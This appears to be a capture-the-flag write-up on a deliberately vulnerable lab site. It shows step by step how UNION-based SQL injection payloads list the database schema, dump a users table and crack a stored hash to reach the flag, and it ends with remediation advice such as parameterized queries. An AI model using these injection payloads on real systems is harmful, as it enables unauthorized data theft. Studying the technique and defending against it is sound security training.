#01_InjectionSQL_users

##Research explanation
- Usually, when you have a field you can fill, the first thing to check is if the field is protected regarding SQL injections.
- We first checked what you could receive when you put an int: you get details about members(ID, First name, Surname)
- We immediately tried to inject a SQL command, 1 UNION SELECT * FROM members WHERE Surname = 'administrator'--'
NB: I put '1  UNION' to close the first SQL request and load another SQL request.
- It seems the field is not protected as we received this message: "You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '\'administrator\'--\'' at line 1"
- After a few pieces of research on how to display DB structure details in SQL, we found a way to return a list of all the columns and tables in the database: https://chartio.com/learn/databases/using-information-schema-views-to-check-to-see-if-table-exists-in-sql-server/ - 1 UNION SELECT TABLE_NAME, COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS
- There is a lot of information in the new list pulled. After a few investigations, it seems some database tables are interesting, such as 'users', which appears to contain user details, and 'db_default', which seems to have the passwords of the users.
C.f. schemaBDD.txt
- Let's query the 'users' table with: 1 UNION SELECT first_name, last_name FROM users. An interesting result is there - ID: 1 UNION SELECT first_name, last_name FROM users 
First name: Flag
Surname : GetThe
- Now, we will get each available column of the 'users' table to see  if we can have more details:
1 UNION SELECT first_name, town FROM users 
=> Surname : 42
1 UNION SELECT first_name, country FROM users 
=> Surname : 42
1 UNION SELECT first_name, planet FROM users 
=> Surname : 42
1 UNION SELECT first_name, commentaire FROM users 
=> Surname : Decrypt this password -> then lower all the char. Sh256 on it, and it's good!
1 UNION SELECT first_name, countersign FROM users 
=> Surname : 5ff9d0165b4f92b14994e5c685cdce28
- Then we decripted it, using the dcode hash website -  https://www.dcode.fr/fonction-hash
=> 5ff9d0165b4f92b14994e5c685cdce28 : FortyTwo
- Then we applied a Sh256 encryption on the 'fortytwo' key and we got this flag:
10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5

##Breach Details 
- SQL injection is a common breach (especially on PHP apps).
- It is an: insertion or ???injection??? of a SQL query via the input data from the client to the application. A successful SQL injection exploit can read sensitive data from the database, modify database data (Insert/Update/Delete), execute administration operations on the database (such as shutdown the DBMS), recover the content of a given file present on the DBMS file system and in some cases issue commands to the operating system.
- According to OWASP, SQL injection attacks allow attackers to spoof identity, tamper with existing data, cause repudiation issues such as voiding transactions or changing balances, allow the complete disclosure of all data on the system, destroy the data or make it otherwise unavailable, and become administrators of the database server.

Recommendation: 
- SQL Injection flaws are introduced when software developers create dynamic database queries that include user-supplied input. To avoid SQL injection flaws is simple. Developers need to either: 
a) stop writing dynamic queries; and/or 
b) prevent user-supplied input which contains malicious SQL from affecting the logic of the executed query. Some solutions: The use of prepared statements with variable binding (aka parameterized queries) is a suitable solution. Parameterized queries force the developer first to define all the SQL code and then pass each parameter to the query later. This coding style allows the database to distinguish between code and data, regardless of what user input is supplied. Input validation can also be a good defense to detect unauthorized input before it is passed to the SQL query.
c) send generic error message,
d) It is also important to hide one or more sensitive parts of the DB, such as 'information.schema'. You can do it using 'phpmyadmin' in the 'config.inc.php' file and add: 
	$cfg['Servers'][$i]['hide_db'] = 'information_schema|performance_schema|mysql';


##How to:
- Input '1 UNION SELECT TABLE_NAME, COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS' in the search member field
- Input '1 UNION SELECT first_name, last_name FROM users' in the search member field
- Input '1 UNION SELECT commentaire, countersign FROM users' in the search member field
- Decode the hash using 'https://www.dcode.fr/fonction-hash'
- Lower the word obtained and encrypt it with sh256 on the same website
- The flag is there.